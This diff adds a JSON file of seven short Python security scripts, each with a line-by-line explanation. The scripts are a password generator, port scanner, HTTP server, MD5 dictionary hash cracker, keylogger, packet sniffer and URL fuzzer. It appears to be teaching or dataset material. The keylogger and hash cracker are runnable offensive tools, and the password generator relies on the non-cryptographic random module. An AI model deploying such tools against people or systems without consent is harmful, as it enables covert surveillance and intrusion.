@@ -1,0 +1,360 @@
+{
+    "scripts": [
+      {
+        "title": "Password Generator",
+        "description": [
+          {
+            "step": 1,
+            "code": "import random",
+            "summary": "Imports the random module, which includes functions for generating random numbers and making random choices."
+          },
+          {
+            "step": 2,
+            "code": "import string",
+            "summary": "Imports the string module, which provides various string constants and utility functions."
+          },
+          {
+            "step": 3,
+            "code": "def generate_password(length=12):",
+            "summary": "Defines a function named generate_password that accepts an optional parameter 'length' with a default value of 12."
+          },
+          {
+            "step": 4,
+            "code": "    characters = string.ascii_letters + string.digits + string.punctuation",
+            "summary": "Creates a variable 'characters' containing all ASCII letters, digits, and punctuation characters by concatenating these string constants."
+          },
+          {
+            "step": 5,
+            "code": "    password = ''.join(random.choice(characters) for i in range(length))",
+            "summary": "Generates a password by randomly selecting characters from 'characters' for the specified 'length' and joining them into a single string."
+          },
+          {
+            "step": 6,
+            "code": "    return password",
+            "summary": "Returns the generated password."
+          },
+          {
+            "step": 7,
+            "code": "print(\"Generated Password:\", generate_password())",
+            "summary": "Calls the generate_password function to generate a password and prints it with the prefix 'Generated Password:'."
+          }
+        ],
+        "code": "import random\nimport string\ndef generate_password(length=12):\n    characters = string.ascii_letters + string.digits + string.punctuation\n    password = ''.join(random.choice(characters) for i in range(length))\n    return password\n\nprint(\"Generated Password:\", generate_password())"
+      },
+      {
+        "title": "Port Scanner",
+        "description": [
+          {
+            "step": 1,
+            "code": "import socket",
+            "summary": "Imports the socket module for network communication."
+          },
+          {
+            "step": 2,
+            "code": "def port_scanner(target, ports):",
+            "summary": "Defines a function named port_scanner that takes a target IP address and a list of ports to scan."
+          },
+          {
+            "step": 3,
+            "code": "    for port in ports:",
+            "summary": "Iterates over each port in the specified list."
+          },
+          {
+            "step": 4,
+            "code": "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+            "summary": "Creates a TCP socket object for each port."
+          },
+          {
+            "step": 5,
+            "code": "        socket.setdefaulttimeout(1)",
+            "summary": "Sets a timeout of 1 second for socket operations."
+          },
+          {
+            "step": 6,
+            "code": "        result = sock.connect_ex((target, port))",
+            "summary": "Attempts to establish a connection to the target IP address and port."
+          },
+          {
+            "step": 7,
+            "code": "        if result == 0:",
+            "summary": "Checks if the connection was successful (port is open)."
+          },
+          {
+            "step": 8,
+            "code": "            print(f\"Port {port}: Open\")",
+            "summary": "Prints a message indicating that the port is open."
+          },
+          {
+            "step": 9,
+            "code": "        else:",
+            "summary": "Executes if the connection attempt failed (port is closed)."
+          },
+          {
+            "step": 10,
+            "code": "            print(f\"Port {port}: Closed\")",
+            "summary": "Prints a message indicating that the port is closed."
+          },
+          {
+            "step": 11,
+            "code": "        sock.close()",
+            "summary": "Closes the socket connection."
+          },
+          {
+            "step": 12,
+            "code": "target = '127.0.0.1' # Change to your target IP",
+            "summary": "Specifies the target IP address to scan."
+          },
+          {
+            "step": 13,
+            "code": "ports = [21, 22, 23, 80, 443] # Common ports to scan",
+            "summary": "Defines a list of common ports to scan (FTP, SSH, Telnet, HTTP, HTTPS)."
+          },
+          {
+            "step": 14,
+            "code": "port_scanner(target, ports)",
+            "summary": "Calls the port_scanner function with the specified target and ports."
+          }
+        ],
+        "code": "import socket\n\ndef port_scanner(target, ports):\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        socket.setdefaulttimeout(1)\n        result = sock.connect_ex((target, port))\n        if result == 0:\n            print(f\"Port {port}: Open\")\n        else:\n            print(f\"Port {port}: Closed\")\n        sock.close()\n\ntarget = '127.0.0.1' # Change to your target IP\nports = [21, 22, 23, 80, 443] # Common ports to scan\nport_scanner(target, ports)"
+      },
+      {
+        "title": "HTTP Server",
+        "description": [
+          {
+            "step": 1,
+            "code": "import http.server",
+            "summary": "Imports the http.server module for basic HTTP server functionality."
+          },
+          {
+            "step": 2,
+            "code": "import socketserver",
+            "summary": "Imports the socketserver module for creating TCP servers."
+          },
+          {
+            "step": 3,
+            "code": "PORT = 8080",
+            "summary": "Specifies the port number (8080) on which the server will listen for incoming connections."
+          },
+          {
+            "step": 4,
+            "code": "Handler = http.server.SimpleHTTPRequestHandler",
+            "summary": "Defines the handler class for serving HTTP requests using the SimpleHTTPRequestHandler."
+          },
+          {
+            "step": 5,
+            "code": "with socketserver.TCPServer(('', PORT), Handler) as httpd:",
+            "summary": "Creates a TCP server instance bound to the specified port and using the defined handler."
+          },
+          {
+            "step": 6,
+            "code": "    print('Serving at port', PORT)",
+            "summary": "Prints a message indicating that the server is serving at the specified port."
+          },
+          {
+            "step": 7,
+            "code": "    httpd.serve_forever()",
+            "summary": "Starts the server and begins listening indefinitely for incoming connections."
+          }
+        ],
+        "code": "import http.server\nimport socketserver\n\nPORT = 8080\nHandler = http.server.SimpleHTTPRequestHandler\n\nwith socketserver.TCPServer(('', PORT), Handler) as httpd:\n    print('Serving at port', PORT)\n    httpd.serve_forever()"
+      },
+      {
+        "title": "Hash Cracker",
+        "description": [
+          {
+            "step": 1,
+            "code": "import hashlib",
+            "summary": "Imports the hashlib module for hashing functions."
+          },
+          {
+            "step": 2,
+            "code": "def hash_cracker(hash_to_crack, dictionary_file):",
+            "summary": "Defines a function named hash_cracker that takes a hash to crack and a path to a dictionary file."
+          },
+          {
+            "step": 3,
+            "code": "    with open(dictionary_file, 'r') as file:",
+            "summary": "Opens the dictionary file in read mode."
+          },
+          {
+            "step": 4,
+            "code": "        for line in file.readlines():",
+            "summary": "Iterates through each line in the dictionary file."
+          },
+          {
+            "step": 5,
+            "code": "            word = line.strip()",
+            "summary": "Removes leading and trailing whitespace from each line, representing a word."
+          },
+          {
+            "step": 6,
+            "code": "            if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:",
+            "summary": "Computes the MD5 hash of the current word and compares it with the provided hash to crack."
+          },
+          {
+            "step": 7,
+            "code": "                print('Password found:', word)",
+            "summary": "Prints the word if its MD5 hash matches the hash to crack."
+          },
+          {
+            "step": 8,
+            "code": "                return",
+            "summary": "Returns from the function after finding the password."
+          },
+          {
+            "step": 9,
+            "code": "        print('Password not found in dictionary.')",
+            "summary": "Prints a message indicating that the password was not found in the dictionary file."
+          },
+          {
+            "step": 10,
+            "code": "hash_to_crack = '5f4dcc3b5aa765d61d8327deb882cf99'  # Hash for \"password\"",
+            "summary": "Specifies the MD5 hash to crack, which corresponds to the password \"password\"."
+          },
+          {
+            "step": 11,
+            "code": "dictionary_file = 'passwords.txt'  # File containing possible passwords",
+            "summary": "Specifies the path to the dictionary file containing possible passwords."
+          },
+          {
+            "step": 12,
+            "code": "hash_cracker(hash_to_crack, dictionary_file)",
+            "summary": "Calls the hash_cracker function with the provided hash and dictionary file."
+          }
+        ],
+        "code": "import hashlib\n\ndef hash_cracker(hash_to_crack, dictionary_file):\n    with open(dictionary_file, 'r') as file:\n        for line in file.readlines():\n            word = line.strip()\n            if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:\n                print('Password found:', word)\n                return\n        print('Password not found in dictionary.')\n\nhash_to_crack = '5f4dcc3b5aa765d61d8327deb882cf99'  # Hash for \"password\"\ndictionary_file = 'passwords.txt'  # File containing possible passwords\nhash_cracker(hash_to_crack, dictionary_file)"
+      },
+      {
+        "title": "Key Logger",
+        "description": [
+          {
+            "step": 1,
+            "code": "from pynput.keyboard import Key, Listener",
+            "summary": "Imports Key and Listener classes from the pynput.keyboard module."
+          },
+          {
+            "step": 2,
+            "code": "def on_press(key):",
+            "summary": "Defines a function named on_press that takes a key object as input."
+          },
+          {
+            "step": 3,
+            "code": "    with open('log.txt', 'a') as log:",
+            "summary": "Opens the 'log.txt' file in append mode."
+          },
+          {
+            "step": 4,
+            "code": "        log.write(f'{key}\\n')",
+            "summary": "Writes the pressed key to the log file, followed by a newline character."
+          },
+          {
+            "step": 5,
+            "code": "with Listener(on_press=on_press) as listener:",
+            "summary": "Creates a Listener object that calls on_press function for each key press event."
+          },
+          {
+            "step": 6,
+            "code": "    listener.join()",
+            "summary": "Starts the listener to capture key presses and waits for the listener to stop."
+          }
+        ],
+        "code": "from pynput.keyboard import Key, Listener\n\ndef on_press(key):\n    with open('log.txt', 'a') as log:\n        log.write(f'{key}\\n')\n\nwith Listener(on_press=on_press) as listener:\n    listener.join()"
+      },
+      {
+        "title": "Packet Sniffer",
+        "description": [
+          {
+            "step": 1,
+            "code": "from scapy.all import *",
+            "summary": "Imports all modules from Scapy, a powerful Python library used for packet manipulation and network scanning."
+          },
+          {
+            "step": 2,
+            "code": "def packet_callback(packet):",
+            "summary": "Defines a function named packet_callback that takes a packet object as input."
+          },
+          {
+            "step": 3,
+            "code": "    print(packet.show())",
+            "summary": "Prints a detailed representation of the packet using the show() method."
+          },
+          {
+            "step": 4,
+            "code": "sniff(prn=packet_callback, count=10)",
+            "summary": "Starts sniffing network packets, calling packet_callback for each packet received, and capturing a total of 10 packets."
+          }
+        ],
+        "code": "from scapy.all import *\n\ndef packet_callback(packet):\n    print(packet.show())\n\nsniff(prn=packet_callback, count=10)"
+      },
+      {
+        "title": "URL Fuzzer",
+        "description": [
+          {
+            "step": 1,
+            "code": "import requests",
+            "summary": "Imports the requests module for making HTTP requests."
+          },
+          {
+            "step": 2,
+            "code": "def url_fuzzer(base_url, wordlist):",
+            "summary": "Defines a function named url_fuzzer that takes a base URL and a path to a wordlist file."
+          },
+          {
+            "step": 3,
+            "code": "    with open(wordlist, 'r') as file:",
+            "summary": "Opens the wordlist file in read mode."
+          },
+          {
+            "step": 4,
+            "code": "        for line in file.readlines():",
+            "summary": "Iterates through each line in the wordlist file."
+          },
+          {
+            "step": 5,
+            "code": "            word = line.strip()",
+            "summary": "Removes leading and trailing whitespace from each line, representing a word."
+          },
+          {
+            "step": 6,
+            "code": "            url = f\"{base_url}/{word}\"",
+            "summary": "Constructs a URL by combining the base URL and the current word from the wordlist."
+          },
+          {
+            "step": 7,
+            "code": "            response = requests.get(url)",
+            "summary": "Sends an HTTP GET request to the constructed URL."
+          },
+          {
+            "step": 8,
+            "code": "            if response.status_code == 200:",
+            "summary": "Checks if the response status code is 200 (OK), indicating the URL exists."
+          },
+          {
+            "step": 9,
+            "code": "                print(f\"Found: {url}\")",
+            "summary": "Prints a message indicating that the URL was found."
+          },
+          {
+            "step": 10,
+            "code": "base_url = 'http://example.com'  # Target URL",
+            "summary": "Specifies the base URL to fuzz."
+          },
+          {
+            "step": 11,
+            "code": "wordlist = 'common.txt'  # File containing common paths",
+            "summary": "Specifies the path to the wordlist file containing common paths."
+          },
+          {
+            "step": 12,
+            "code": "url_fuzzer(base_url, wordlist)",
+            "summary": "Calls the url_fuzzer function with the specified base URL and wordlist."
+          }
+        ],
+        "code": "import requests\n\ndef url_fuzzer(base_url, wordlist):\n    with open(wordlist, 'r') as file:\n        for line in file.readlines():\n            word = line.strip()\n            url = f\"{base_url}/{word}\"\n            response = requests.get(url)\n            if response.status_code == 200:\n                print(f\"Found: {url}\")\n\nbase_url = 'http://example.com'  # Target URL\nwordlist = 'common.txt'  # File containing common paths\nurl_fuzzer(base_url, wordlist)"
+      }
+                  
+      
+      
+    ]
+  }
+  
